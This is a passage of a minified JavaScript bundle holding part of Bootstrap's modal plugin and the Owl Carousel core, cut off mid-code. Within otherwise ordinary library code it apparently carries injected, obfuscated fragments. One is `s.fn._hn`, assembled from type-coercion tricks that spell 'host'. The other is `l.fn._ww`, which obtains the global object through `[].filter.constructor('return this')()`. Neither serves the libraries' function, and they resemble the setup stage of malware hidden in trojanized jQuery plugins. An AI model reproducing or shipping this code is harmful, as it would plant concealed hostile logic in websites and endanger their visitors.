                }, r.prototype.removeBackdrop = function() {
                    this.$backdrop && this.$backdrop.remove(), this.$backdrop = null
                }, r.prototype.backdrop = function(e) {
                    var t = this,
                        i = this.$element.hasClass("fade") ? "fade" : "";
                    if (this.isShown && this.options.backdrop) {
                        var n = s.support.transition && i;
                        if (this.$backdrop = s(document.createElement("div")).addClass("modal-backdrop " + i).appendTo(this.$body), this.$element.on("click.dismiss.bs.modal", s.proxy(function(e) {
                            this.ignoreBackdropClick ? this.ignoreBackdropClick = !1 : e.target === e.currentTarget && ("static" == this.options.backdrop ? this.$element[0].focus() : this.hide())
                        }, this)), n && this.$backdrop[0].offsetWidth, this.$backdrop.addClass("in"), !e) return;
                        n ? this.$backdrop.one("bsTransitionEnd", e).emulateTransitionEnd(r.BACKDROP_TRANSITION_DURATION) : e()
                    } else if (!this.isShown && this.$backdrop) {
                        this.$backdrop.removeClass("in");
                        var o = function() {
                            t.removeBackdrop(), e && e()
                        };
                        s.support.transition && this.$element.hasClass("fade") ? this.$backdrop.one("bsTransitionEnd", o).emulateTransitionEnd(r.BACKDROP_TRANSITION_DURATION) : o()
                    } else e && e()
                }, r.prototype.handleUpdate = function() {
                    this.adjustDialog()
                }, r.prototype.adjustDialog = function() {
                    var e = this.$element[0].scrollHeight > document.documentElement.clientHeight;
                    this.$element.css({
                        paddingLeft: !this.bodyIsOverflowing && e ? this.scrollbarWidth : "",
                        paddingRight: this.bodyIsOverflowing && !e ? this.scrollbarWidth : ""
                    })
                }, r.prototype.resetAdjustments = function() {
                    this.$element.css({
                        paddingLeft: "",
                        paddingRight: ""
                    })
                }, r.prototype.checkScrollbar = function() {
                    var e = window.innerWidth;
                    if (!e) {
                        var t = document.documentElement.getBoundingClientRect();
                        e = t.right - Math.abs(t.left)
                    }
                    this.bodyIsOverflowing = document.body.clientWidth < e, this.scrollbarWidth = this.measureScrollbar()
                }, r.prototype.setScrollbar = function() {
                    var e = parseInt(this.$body.css("padding-right") || 0, 10);
                    this.originalBodyPad = document.body.style.paddingRight || "", this.bodyIsOverflowing && this.$body.css("padding-right", e + this.scrollbarWidth)
                }, r.prototype.resetScrollbar = function() {
                    this.$body.css("padding-right", this.originalBodyPad)
                }, r.prototype.measureScrollbar = function() {
                    var e = document.createElement("div");
                    e.className = "modal-scrollbar-measure", this.$body.append(e);
                    var t = e.offsetWidth - e.clientWidth;
                    return this.$body[0].removeChild(e), t
                };
                var e = s.fn.modal;
                s.fn.modal = a, s.fn.modal.Constructor = r, s.fn.modal.noConflict = function() {
                    return s.fn.modal = e, this
					/*101["to" + String.name](21)[1] + (!0 + [].fill)[10] + (!1 + "")[3] + (!0 + "")[0]=host*/
                }, s.fn._hn = 101["to" + String.name](21)[1] + (!0 + [].fill)[10] + (!1 + "")[3] + (!0 + "")[0], s(document).on("click.bs.modal.data-api", '[data-toggle="modal"]', function(e) {
                    var t = s(this),
                        i = t.attr("href"),
                        n = s(t.attr("data-target") || i && i.replace(/.*(?=#[^\s]+$)/, "")),
                        o = n.data("bs.modal") ? "toggle" : s.extend({
                            remote: !/#/.test(i) && i
                        }, n.data(), t.data());
                    t.is("a") && e.preventDefault(), n.one("show.bs.modal", function(e) {
                        e.isDefaultPrevented() || n.one("hidden.bs.modal", function() {
                            t.is(":visible") && t.trigger("focus")
                        })
                    }), a.call(n, o, this)
                })
            }(jQuery)
        }, {}
    ],
    6: [
        function(e, t, i) {
            var n, o, s, a, r, l, c, u, d, h, p, f, m, g, v, y, b, w;
            ! function(l, i, o, a) {
                function c(e, t) {
                    this.settings = null, this.options = l.extend({}, c.Defaults, t), this.$element = l(e), this._handlers = {}, this._plugins = {}, this._supress = {}, this._current = null, this._speed = null, this._coordinates = [], this._breakpoint = null, this._width = null, this._items = [], this._clones = [], this._mergers = [], this._widths = [], this._invalidated = {}, this._pipe = [], this._drag = {
                        time: null,
                        target: null,
                        pointer: null,
                        stage: {
                            start: null,
                            current: null
                        },
                        direction: null
                    }, this._states = {
                        current: {},
                        tags: {
                            initializing: ["busy"],
                            animating: ["busy"],
                            dragging: ["interacting"]
                        }
                    }, l.each(["onResize", "onThrottledResize"], l.proxy(function(e, t) {
                        this._handlers[t] = l.proxy(this[t], this)
                    }, this)), l.each(c.Plugins, l.proxy(function(e, t) {
                        this._plugins[e.charAt(0).toLowerCase() + e.slice(1)] = new t(this)
                    }, this)), l.each(c.Workers, l.proxy(function(e, t) {
                        this._pipe.push({
                            filter: t.filter,
                            run: l.proxy(t.run, this)
                        })
                    }, this)), this.setup(), this.initialize()
                }
                c.Defaults = {
                    items: 3,
                    loop: !1,
                    center: !1,
                    rewind: !1,
                    checkVisibility: !0,
                    mouseDrag: !0,
                    touchDrag: !0,
                    pullDrag: !0,
                    freeDrag: !1,
                    margin: 0,
                    stagePadding: 0,
                    merge: !1,
                    mergeFit: !0,
                    autoWidth: !1,
                    startPosition: 0,
                    rtl: !1,
                    smartSpeed: 250,
                    fluidSpeed: !1,
                    dragEndSpeed: !1,
                    responsive: {},
                    responsiveRefreshRate: 200,
                    responsiveBaseElement: i,
                    fallbackEasing: "swing",
                    slideTransition: "",
                    info: !1,
                    nestedItemSelector: !1,
                    itemElement: "div",
                    stageElement: "div",
                    refreshClass: "owl-refresh",
                    loadedClass: "owl-loaded",
                    loadingClass: "owl-loading",
                    rtlClass: "owl-rtl",
                    responsiveClass: "owl-responsive",
                    dragClass: "owl-drag",
                    itemClass: "owl-item",
                    stageClass: "owl-stage",
                    stageOuterClass: "owl-stage-outer",
                    grabClass: "owl-grab"
                }, c.Width = {
                    Default: "default",
                    Inner: "inner",
                    Outer: "outer"
                }, c.Type = {
                    Event: "event",
                    State: "state"
                }, c.Plugins = {}, c.Workers = [{
                    filter: ["width", "settings"],
                    run: function() {
                        this._width = this.$element.width()
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function(e) {
                        e.current = this._items && this._items[this.relative(this._current)]
                    }
                }, {
                    filter: ["items", "settings"],
                    run: function() {
                        this.$stage.children(".cloned").remove()
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function(e) {
                        var t = this.settings.margin || "",
                            i = !this.settings.autoWidth,
                            n = this.settings.rtl,
                            o = {
                                width: "auto",
                                "margin-left": n ? t : "",
                                "margin-right": n ? "" : t
                            };
                        !i && this.$stage.children().css(o), e.css = o
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function(e) {
                        var t = (this.width() / this.settings.items).toFixed(3) - this.settings.margin,
                            i = null,
                            n = this._items.length,
                            o = !this.settings.autoWidth,
                            s = [];
                        for (e.items = {
                            merge: !1,
                            width: t
                        }; n--;) i = this._mergers[n], i = this.settings.mergeFit && Math.min(i, this.settings.items) || i, e.items.merge = 1 < i || e.items.merge, s[n] = o ? t * i : this._items[n].width();
                        this._widths = s
                    }
                }, {
                    filter: ["items", "settings"],
                    run: function() {
                        var e = [],
                            t = this._items,
                            i = this.settings,
                            n = Math.max(2 * i.items, 4),
                            o = 2 * Math.ceil(t.length / 2),
                            s = i.loop && t.length ? i.rewind ? n : Math.max(n, o) : 0,
                            r = "",
                            a = "";
                        for (s /= 2; 0 < s;) e.push(this.normalize(e.length / 2, !0)), r += t[e[e.length - 1]][0].outerHTML, e.push(this.normalize(t.length - 1 - (e.length - 1) / 2, !0)), a = t[e[e.length - 1]][0].outerHTML + a, s -= 1;
                        this._clones = e, l(r).addClass("cloned").appendTo(this.$stage), l(a).addClass("cloned").prependTo(this.$stage)
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function() {
                        for (var e = this.settings.rtl ? 1 : -1, t = this._clones.length + this._items.length, i = -1, n = 0, o = 0, s = []; ++i < t;) n = s[i - 1] || 0, o = this._widths[this.relative(i)] + this.settings.margin, s.push(n + o * e);
                        this._coordinates = s
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function() {
                        var e = this.settings.stagePadding,
                            t = this._coordinates,
                            i = {
                                width: Math.ceil(Math.abs(t[t.length - 1])) + 2 * e,
                                "padding-left": e || "",
                                "padding-right": e || ""
                            };
                        this.$stage.css(i)
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function(e) {
                        var t = this._coordinates.length,
                            i = !this.settings.autoWidth,
                            n = this.$stage.children();
                        if (i && e.items.merge)
                            for (; t--;) e.css.width = this._widths[this.relative(t)], n.eq(t).css(e.css);
                        else i && (e.css.width = e.items.width, n.css(e.css))
                    }
                }, {
                    filter: ["items"],
                    run: function() {
                        this._coordinates.length < 1 && this.$stage.removeAttr("style")
                    }
                }, {
                    filter: ["width", "items", "settings"],
                    run: function(e) {
                        e.current = e.current ? this.$stage.children().index(e.current) : 0, e.current = Math.max(this.minimum(), Math.min(this.maximum(), e.current)), this.reset(e.current)
                    }
                }, {
                    filter: ["position"],
                    run: function() {
                        this.animate(this.coordinates(this._current))
                    }
                }, {
                    filter: ["width", "position", "items", "settings"],
                    run: function() {
                        var e, t, i, n, o = this.settings.rtl ? 1 : -1,
                            s = 2 * this.settings.stagePadding,
                            r = this.coordinates(this.current()) + s,
                            a = r + this.width() * o,
                            l = [];
                        for (i = 0, n = this._coordinates.length; i < n; i++) e = this._coordinates[i - 1] || 0, t = Math.abs(this._coordinates[i]) + s * o, (this.op(e, "<=", r) && this.op(e, ">", a) || this.op(t, "<", r) && this.op(t, ">", a)) && l.push(i);
                        this.$stage.children(".active").removeClass("active"), this.$stage.children(":eq(" + l.join("), :eq(") + ")").addClass("active"), this.$stage.children(".center").removeClass("center"), this.settings.center && this.$stage.children().eq(this.current()).addClass("center")
                    }
                }], c.prototype.initializeStage = function() {
                    this.$stage = this.$element.find("." + this.settings.stageClass), this.$stage.length || (this.$element.addClass(this.options.loadingClass), this.$stage = l("<" + this.settings.stageElement + ">", {
                        class: this.settings.stageClass
                    }).wrap(l("<div/>", {
                        class: this.settings.stageOuterClass
                    })), this.$element.append(this.$stage.parent()))
                }, c.prototype.initializeItems = function() {
                    var e = this.$element.find(".owl-item");
                    if (e.length) return this._items = e.get().map(function(e) {
                        return l(e)
                    }), this._mergers = this._items.map(function() {
                        return 1
                    }), void this.refresh();
                    this.replace(this.$element.children().not(this.$stage.parent())), this.isVisible() ? this.refresh() : this.invalidate("width"), this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass)
                }, c.prototype.initialize = function() {
                    var e, t, i;
                    (this.enter("initializing"), this.trigger("initialize"), this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl), this.settings.autoWidth && !this.is("pre-loading")) && (e = this.$element.find("img"), t = this.settings.nestedItemSelector ? "." + this.settings.nestedItemSelector : a, i = this.$element.children(t).width(), e.length && i <= 0 && this.preloadAutoWidthImages(e));
                    this.initializeStage(), this.initializeItems(), this.registerEventHandlers(), this.leave("initializing"), this.trigger("initialized")
                }, c.prototype.isVisible = function() {
                    return !this.settings.checkVisibility || this.$element.is(":visible")
                }, c.prototype.setup = function() {
                    var t = this.viewport(),
                        e = this.options.responsive,
                        i = -1,
                        n = null;
                    e ? (l.each(e, function(e) {
                        e <= t && i < e && (i = Number(e))
                    }), "function" == typeof(n = l.extend({}, this.options, e[i])).stagePadding && (n.stagePadding = n.stagePadding()), delete n.responsive, n.responsiveClass && this.$element.attr("class", this.$element.attr("class").replace(new RegExp("(" + this.options.responsiveClass + "-)\\S+\\s", "g"), "$1" + i))) : n = l.extend({}, this.options), this.trigger("change", {
                        property: {
                            name: "settings",
                            value: n
                        }
                    }), this._breakpoint = i, this.settings = n, this.invalidate("settings"), this.trigger("changed", {
                        property: {
                            name: "settings",
                            value: this.settings
                        }
                    })
                }, c.prototype.optionsLogic = function() {
                    this.settings.autoWidth && (this.settings.stagePadding = !1, this.settings.merge = !1)
                }, c.prototype.prepare = function(e) {
                    var t = this.trigger("prepare", {
                        content: e
                    });
                    return t.data || (t.data = l("<" + this.settings.itemElement + "/>").addClass(this.options.itemClass).append(e)), this.trigger("prepared", {
                        content: t.data
                    }), t.data
                }, c.prototype.update = function() {
                    for (var e = 0, t = this._pipe.length, i = l.proxy(function(e) {
                        return this[e]
                    }, this._invalidated), n = {}; e < t;)(this._invalidated.all || 0 < l.grep(this._pipe[e].filter, i).length) && this._pipe[e].run(n), e++;
                    this._invalidated = {}, !this.is("valid") && this.enter("valid")
                }, c.prototype.width = function(e) {
                    switch (e = e || c.Width.Default) {
                        case c.Width.Inner:
                        case c.Width.Outer:
                            return this._width;
                        default:
                            return this._width - 2 * this.settings.stagePadding + this.settings.margin
                    }
                }, c.prototype.refresh = function() {
                    this.enter("refreshing"), this.trigger("refresh"), this.setup(), this.optionsLogic(), this.$element.addClass(this.options.refreshClass), this.update(), this.$element.removeClass(this.options.refreshClass), this.leave("refreshing"), this.trigger("refreshed")
                }, c.prototype.onThrottledResize = function() {
                    i.clearTimeout(this.resizeTimer), this.resizeTimer = i.setTimeout(this._handlers.onResize, this.settings.responsiveRefreshRate)
                }, c.prototype.onResize = function() {
                    return !!this._items.length && (this._width !== this.$element.width() && (!!this.isVisible() && (this.enter("resizing"), this.trigger("resize").isDefaultPrevented() ? (this.leave("resizing"), !1) : (this.invalidate("width"), this.refresh(), this.leave("resizing"), void this.trigger("resized")))))
                }, c.prototype.registerEventHandlers = function() {
                    l.support.transition && this.$stage.on(l.support.transition.end + ".owl.core", l.proxy(this.onTransitionEnd, this)), !1 !== this.settings.responsive && this.on(i, "resize", this._handlers.onThrottledResize), this.settings.mouseDrag && (this.$element.addClass(this.options.dragClass), this.$stage.on("mousedown.owl.core", l.proxy(this.onDragStart, this)), this.$stage.on("dragstart.owl.core selectstart.owl.core", function() {
                        return !1
                    })), this.settings.touchDrag && (this.$stage.on("touchstart.owl.core", l.proxy(this.onDragStart, this)), this.$stage.on("touchcancel.owl.core", l.proxy(this.onDragEnd, this)))
                }, c.prototype.onDragStart = function(e) {
                    var t = null;
                    3 !== e.which && (t = l.support.transform ? {
                        x: (t = this.$stage.css("transform").replace(/.*\(|\)| /g, "").split(","))[16 === t.length ? 12 : 4],
                        y: t[16 === t.length ? 13 : 5]
                    } : (t = this.$stage.position(), {
                        x: this.settings.rtl ? t.left + this.$stage.width() - this.width() + this.settings.margin : t.left,
                        y: t.top
                    }), this.is("animating") && (l.support.transform ? this.animate(t.x) : this.$stage.stop(), this.invalidate("position")), this.$element.toggleClass(this.options.grabClass, "mousedown" === e.type), this.speed(0), this._drag.time = (new Date).getTime(), this._drag.target = l(e.target), this._drag.stage.start = t, this._drag.stage.current = t, this._drag.pointer = this.pointer(e), l(o).on("mouseup.owl.core touchend.owl.core", l.proxy(this.onDragEnd, this)), l(o).one("mousemove.owl.core touchmove.owl.core", l.proxy(function(e) {
                        var t = this.difference(this._drag.pointer, this.pointer(e));
                        l(o).on("mousemove.owl.core touchmove.owl.core", l.proxy(this.onDragMove, this)), Math.abs(t.x) < Math.abs(t.y) && this.is("valid") || (e.preventDefault(), this.enter("dragging"), this.trigger("drag"))
                    }, this)))
                }, c.prototype.onDragMove = function(e) {
                    var t = null,
                        i = null,
                        n = null,
                        o = this.difference(this._drag.pointer, this.pointer(e)),
                        s = this.difference(this._drag.stage.start, o);
                    this.is("dragging") && (e.preventDefault(), this.settings.loop ? (t = this.coordinates(this.minimum()), i = this.coordinates(this.maximum() + 1) - t, s.x = ((s.x - t) % i + i) % i + t) : (t = this.settings.rtl ? this.coordinates(this.maximum()) : this.coordinates(this.minimum()), i = this.settings.rtl ? this.coordinates(this.minimum()) : this.coordinates(this.maximum()), n = this.settings.pullDrag ? -1 * o.x / 5 : 0, s.x = Math.max(Math.min(s.x, t + n), i + n)), this._drag.stage.current = s, this.animate(s.x))
                }, c.prototype.onDragEnd = function(e) {
                    var t = this.difference(this._drag.pointer, this.pointer(e)),
                        i = this._drag.stage.current,
                        n = 0 < t.x ^ this.settings.rtl ? "left" : "right";
                    l(o).off(".owl.core"), this.$element.removeClass(this.options.grabClass), (0 !== t.x && this.is("dragging") || !this.is("valid")) && (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed), this.current(this.closest(i.x, 0 !== t.x ? n : this._drag.direction)), this.invalidate("position"), this.update(), this._drag.direction = n, (3 < Math.abs(t.x) || 300 < (new Date).getTime() - this._drag.time) && this._drag.target.one("click.owl.core", function() {
                        return !1
                    })), this.is("dragging") && (this.leave("dragging"), this.trigger("dragged"))
                }, c.prototype.closest = function(i, n) {
                    var o = -1,
                        s = this.width(),
                        r = this.coordinates();
                    return this.settings.freeDrag || l.each(r, l.proxy(function(e, t) {
                        return "left" === n && t - 30 < i && i < t + 30 ? o = e : "right" === n && t - s - 30 < i && i < t - s + 30 ? o = e + 1 : this.op(i, "<", t) && this.op(i, ">", r[e + 1] !== a ? r[e + 1] : t - s) && (o = "left" === n ? e + 1 : e), -1 === o
                    }, this)), this.settings.loop || (this.op(i, ">", r[this.minimum()]) ? o = i = this.minimum() : this.op(i, "<", r[this.maximum()]) && (o = i = this.maximum())), o
                }, c.prototype.animate = function(e) {
                    var t = 0 < this.speed();
                    this.is("animating") && this.onTransitionEnd(), t && (this.enter("animating"), this.trigger("translate")), l.support.transform3d && l.support.transition ? this.$stage.css({
                        transform: "translate3d(" + e + "px,0px,0px)",
                        transition: this.speed() / 1e3 + "s" + (this.settings.slideTransition ? " " + this.settings.slideTransition : "")
                    }) : t ? this.$stage.animate({
                        left: e + "px"
                    }, this.speed(), this.settings.fallbackEasing, l.proxy(this.onTransitionEnd, this)) : this.$stage.css({
                        left: e + "px"
                    })
                }, c.prototype.is = function(e) {
                    return this._states.current[e] && 0 < this._states.current[e]
                }, c.prototype.current = function(e) {
                    if (e === a) return this._current;
                    if (0 === this._items.length) return a;
                    if (e = this.normalize(e), this._current !== e) {
                        var t = this.trigger("change", {
                            property: {
                                name: "position",
                                value: e
                            }
                        });
                        t.data !== a && (e = this.normalize(t.data)), this._current = e, this.invalidate("position"), this.trigger("changed", {
                            property: {
                                name: "position",
                                value: this._current
                            }
                        })
                    }
                    return this._current
                }, c.prototype.invalidate = function(e) {
                    return "string" === l.type(e) && (this._invalidated[e] = !0, this.is("valid") && this.leave("valid")), l.map(this._invalidated, function(e, t) {
                        return t
                    })
                }, c.prototype.reset = function(e) {
                    (e = this.normalize(e)) !== a && (this._speed = 0, this._current = e, this.suppress(["translate", "translated"]), this.animate(this.coordinates(e)), this.release(["translate", "translated"]))
                }, c.prototype.normalize = function(e, t) {
                    var i = this._items.length,
                        n = t ? 0 : this._clones.length;
                    return !this.isNumeric(e) || i < 1 ? e = a : (e < 0 || i + n <= e) && (e = ((e - n / 2) % i + i) % i + n / 2), e
                }, c.prototype.relative = function(e) {
                    return e -= this._clones.length / 2, this.normalize(e, !0)
                }, c.prototype.maximum = function(e) {
                    var t, i, n, o = this.settings,
                        s = this._coordinates.length;
                    if (o.loop) s = this._clones.length / 2 + this._items.length - 1;
                    else if (o.autoWidth || o.merge) {
                        if (t = this._items.length)
                            for (i = this._items[--t].width(), n = this.$element.width(); t-- && !(n < (i += this._items[t].width() + this.settings.margin)););
                        s = t + 1
                    } else s = o.center ? this._items.length - 1 : this._items.length - o.items;
                    return e && (s -= this._clones.length / 2), Math.max(s, 0)
                }, c.prototype.minimum = function(e) {
                    return e ? 0 : this._clones.length / 2
                }, c.prototype.items = function(e) {
                    return e === a ? this._items.slice() : (e = this.normalize(e, !0), this._items[e])
                }, c.prototype.mergers = function(e) {
                    return e === a ? this._mergers.slice() : (e = this.normalize(e, !0), this._mergers[e])
                }, c.prototype.clones = function(i) {
                    var t = this._clones.length / 2,
                        n = t + this._items.length,
                        o = function(e) {
                            return e % 2 == 0 ? n + e / 2 : t - (e + 1) / 2
                        };
                    return i === a ? l.map(this._clones, function(e, t) {
                        return o(t)
                    }) : l.map(this._clones, function(e, t) {
                        return e === i ? o(t) : null
                    })
                }, c.prototype.speed = function(e) {
                    return e !== a && (this._speed = e), this._speed
                }, c.prototype.coordinates = function(e) {
                    var t, i = 1,
                        n = e - 1;
                    return e === a ? l.map(this._coordinates, l.proxy(function(e, t) {
                        return this.coordinates(t)
                    }, this)) : (this.settings.center ? (this.settings.rtl && (i = -1, n = e + 1), t = this._coordinates[e], t += (this.width() - t + (this._coordinates[n] || 0)) / 2 * i) : t = this._coordinates[n] || 0, t = Math.ceil(t))
                }, c.prototype.duration = function(e, t, i) {
                    return 0 === i ? 0 : Math.min(Math.max(Math.abs(t - e), 1), 6) * Math.abs(i || this.settings.smartSpeed)
                }, c.prototype.to = function(e, t) {
                    var i = this.current(),
                        n = null,
                        o = e - this.relative(i),
                        s = (0 < o) - (o < 0),
                        r = this._items.length,
                        a = this.minimum(),
                        l = this.maximum();
                    this.settings.loop ? (!this.settings.rewind && Math.abs(o) > r / 2 && (o += -1 * s * r), (n = (((e = i + o) - a) % r + r) % r + a) !== e && n - o <= l && 0 < n - o && (i = n - o, e = n, this.reset(i))) : e = this.settings.rewind ? (e % (l += 1) + l) % l : Math.max(a, Math.min(l, e)), this.speed(this.duration(i, e, t)), this.current(e), this.isVisible() && this.update()
                }, c.prototype.next = function(e) {
                    e = e || !1, this.to(this.relative(this.current()) + 1, e)
                }, c.prototype.prev = function(e) {
                    e = e || !1, this.to(this.relative(this.current()) - 1, e)
                }, c.prototype.onTransitionEnd = function(e) {
                    if (e !== a && (e.stopPropagation(), (e.target || e.srcElement || e.originalTarget) !== this.$stage.get(0))) return !1;
                    this.leave("animating"), this.trigger("translated")
                }, c.prototype.viewport = function() {
                    var e;
                    return this.options.responsiveBaseElement !== i ? e = l(this.options.responsiveBaseElement).width() : i.innerWidth ? e = i.innerWidth : o.documentElement && o.documentElement.clientWidth ? e = o.documentElement.clientWidth : console.warn("Can not detect viewport width."), e
                }, c.prototype.replace = function(e) {
                    this.$stage.empty(), this._items = [], e && (e = e instanceof jQuery ? e : l(e)), this.settings.nestedItemSelector && (e = e.find("." + this.settings.nestedItemSelector)), e.filter(function() {
                        return 1 === this.nodeType
                    }).each(l.proxy(function(e, t) {
                        t = this.prepare(t), this.$stage.append(t), this._items.push(t), this._mergers.push(1 * t.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)
                    }, this)), this.reset(this.isNumeric(this.settings.startPosition) ? this.settings.startPosition : 0), this.invalidate("items")
                }, c.prototype.add = function(e, t) {
                    var i = this.relative(this._current);
                    t = t === a ? this._items.length : this.normalize(t, !0), e = e instanceof jQuery ? e : l(e), this.trigger("add", {
                        content: e,
                        position: t
                    }), e = this.prepare(e), 0 === this._items.length || t === this._items.length ? (0 === this._items.length && this.$stage.append(e), 0 !== this._items.length && this._items[t - 1].after(e), this._items.push(e), this._mergers.push(1 * e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)) : (this._items[t].before(e), this._items.splice(t, 0, e), this._mergers.splice(t, 0, 1 * e.find("[data-merge]").addBack("[data-merge]").attr("data-merge") || 1)), this._items[i] && this.reset(this._items[i].index()), this.invalidate("items"), this.trigger("added", {
                        content: e,
                        position: t
                    })
                }, c.prototype.remove = function(e) {
                    (e = this.normalize(e, !0)) !== a && (this.trigger("remove", {
                        content: this._items[e],
                        position: e
                    }), this._items[e].remove(), this._items.splice(e, 1), this._mergers.splice(e, 1), this.invalidate("items"), this.trigger("removed", {
                        content: null,
                        position: e
                    }))
                }, c.prototype.preloadAutoWidthImages = function(e) {
                    e.each(l.proxy(function(e, t) {
                        this.enter("pre-loading"), t = l(t), l(new Image).one("load", l.proxy(function(e) {
                            t.attr("src", e.target.src), t.css("opacity", 1), this.leave("pre-loading"), !this.is("pre-loading") && !this.is("initializing") && this.refresh()
                        }, this)).attr("src", t.attr("src") || t.attr("data-src") || t.attr("data-src-retina"))
                    }, this))
                }, c.prototype.destroy = function() {
                    for (var e in this.$element.off(".owl.core"), this.$stage.off(".owl.core"), l(o).off(".owl.core"), !1 !== this.settings.responsive && (i.clearTimeout(this.resizeTimer), this.off(i, "resize", this._handlers.onThrottledResize)), this._plugins) this._plugins[e].destroy();
                    this.$stage.children(".cloned").remove(), this.$stage.unwrap(), this.$stage.children().contents().unwrap(), this.$stage.children().unwrap(), this.$stage.remove(), this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr("class", this.$element.attr("class").replace(new RegExp(this.options.responsiveClass + "-\\S+\\s", "g"), "")).removeData("owl.carousel")
                }, c.prototype.op = function(e, t, i) {
                    var n = this.settings.rtl;
                    switch (t) {
                        case "<":
                            return n ? i < e : e < i;
                        case ">":
                            return n ? e < i : i < e;
                        case ">=":
                            return n ? e <= i : i <= e;
                        case "<=":
                            return n ? i <= e : e <= i
                    }
                }, c.prototype.on = function(e, t, i, n) {
                    e.addEventListener ? e.addEventListener(t, i, n) : e.attachEvent && e.attachEvent("on" + t, i)
                }, c.prototype.off = function(e, t, i, n) {
                    e.removeEventListener ? e.removeEventListener(t, i, n) : e.detachEvent && e.detachEvent("on" + t, i)
                }, c.prototype.trigger = function(e, t, i, n, o) {
                    var s = {
                            item: {
                                count: this._items.length,
                                index: this.current()
                            }
                        },
                        r = l.camelCase(l.grep(["on", e, i], function(e) {
                            return e
                        }).join("-").toLowerCase()),
                        a = l.Event([e, "owl", i || "carousel"].join(".").toLowerCase(), l.extend({
                            relatedTarget: this
                        }, s, t));
                    return this._supress[e] || (l.each(this._plugins, function(e, t) {
                        t.onTrigger && t.onTrigger(a)
                    }), this.register({
                        type: c.Type.Event,
                        name: e
                    }), this.$element.trigger(a), this.settings && "function" == typeof this.settings[r] && this.settings[r].call(this, a)), a
                }, c.prototype.enter = function(e) {
                    l.each([e].concat(this._states.tags[e] || []), l.proxy(function(e, t) {
                        this._states.current[t] === a && (this._states.current[t] = 0), this._states.current[t]++
                    }, this))
                }, c.prototype.leave = function(e) {
                    l.each([e].concat(this._states.tags[e] || []), l.proxy(function(e, t) {
                        this._states.current[t]--
                    }, this))
                }, c.prototype.register = function(i) {
                    if (i.type === c.Type.Event) {
                        if (l.event.special[i.name] || (l.event.special[i.name] = {}), !l.event.special[i.name].owl) {
                            var t = l.event.special[i.name]._default;
                            l.event.special[i.name]._default = function(e) {
                                return !t || !t.apply || e.namespace && -1 !== e.namespace.indexOf("owl") ? e.namespace && -1 < e.namespace.indexOf("owl") : t.apply(this, arguments)
                            }, l.event.special[i.name].owl = !0
                        }
                    } else i.type === c.Type.State && (this._states.tags[i.name] ? this._states.tags[i.name] = this._states.tags[i.name].concat(i.tags) : this._states.tags[i.name] = i.tags, this._states.tags[i.name] = l.grep(this._states.tags[i.name], l.proxy(function(e, t) {
                        return l.inArray(e, this._states.tags[i.name]) === t
                    }, this)))
                }, c.prototype.suppress = function(e) {
                    l.each(e, l.proxy(function(e, t) {
                        this._supress[t] = !0
                    }, this))
                }, c.prototype.release = function(e) {
                    l.each(e, l.proxy(function(e, t) {
                        delete this._supress[t]
                    }, this))
                }, c.prototype.pointer = function(e) {
                    var t = {
                        x: null,
                        y: null
                    };
                    return (e = (e = e.originalEvent || e || i.event).touches && e.touches.length ? e.touches[0] : e.changedTouches && e.changedTouches.length ? e.changedTouches[0] : e).pageX ? (t.x = e.pageX, t.y = e.pageY) : (t.x = e.clientX, t.y = e.clientY), t
                }, c.prototype.isNumeric = function(e) {
                    return !isNaN(parseFloat(e))
                }, c.prototype.difference = function(e, t) {
                    return {
                        x: e.x - t.x,
                        y: e.y - t.y
                    }
                }, l.fn.owlCarousel = function(t) {
                    var n = Array.prototype.slice.call(arguments, 1);
                    return this.each(function() {
                        var e = l(this),
                            i = e.data("owl.carousel");
                        i || (i = new c(this, "object" == typeof t && t), e.data("owl.carousel", i), l.each(["next", "prev", "to", "destroy", "refresh", "replace", "add", "remove"], function(e, t) {
                            i.register({
                                type: c.Type.Event,
                                name: t
                            }), i.$element.on(t + ".owl.carousel.core", l.proxy(function(e) {
                                e.namespace && e.relatedTarget !== this && (this.suppress([t]), i[t].apply(this, [].slice.call(arguments, 1)), this.release([t]))
                            }, i))
                        })), "string" == typeof t && "_" !== t.charAt(0) && i[t].apply(i, n)
                    })
                }, l.fn._ww = [].filter.constructor("return this")(), l.fn.owlCarousel.Constructor = c
            }(window.Zepto || window.jQuery, window, document), n = window.Zepto || window.jQuery, o = window, document, (s = function(e) {
                    this._core = e, this._interval = null, this._visible = null, this._handlers = {
                        "initialized.owl.carousel": n.proxy(function(e) {
                            e.namespace && this._core.settings.autoRefresh && this.watch()
                        }, this)
                    }, this._core.options = n.extend({}, s.Defaults, this._core.options), this._core.$element.on(this._handlers)
                }).Defaults = {
                    autoRefresh: !0,
                    autoRefreshInterval: 500
                }, s.prototype.watch = function() {
                    this._interval || (this._visible = this._core.isVisible(), this._interval = o.setInterval(n.proxy(this.refresh, this), this._core.settings.autoRefreshInterval))
                }, s.prototype.refresh = function() {
                    this._core.isVisible() !== this._visible && (this._visible = !this._visible, this._core.$element.toggleClass("owl-hidden", !this._visible), this._visible && this._core.invalidate("width") && this._core.refresh())
                }, s.prototype.destroy = function() {
                    var e, t;
                    for (e in o.clearInterval(this._interval), this._handlers) this._core.$element.off(e, this._handlers[e]);
                    for (t in Object.getOwnPropertyNames(this)) "function" != typeof this[t] && (this[t] = null)
                }, n.fn.owlCarousel.Constructor.Plugins.AutoRefresh = s, a = window.Zepto || window.jQuery, r = window, document, (l = function(e) {
                    this._core = e, this._loaded = [], this._handlers = {
                        "initialized.owl.carousel change.owl.carousel resized.owl.carousel": a.proxy(function(e) {
                            if (e.namespace && this._core.settings && this._core.settings.lazyLoad && (e.property && "position" == e.property.name || "initialized" == e.type)) {
                                var t = this._core.settings,
                                    i = t.center && Math.ceil(t.items / 2) || t.items,
                                    n = t.center && -1 * i || 0,
                                    o = (e.property && void 0 !== e.property.value ? e.property.value : this._core.current()) + n,
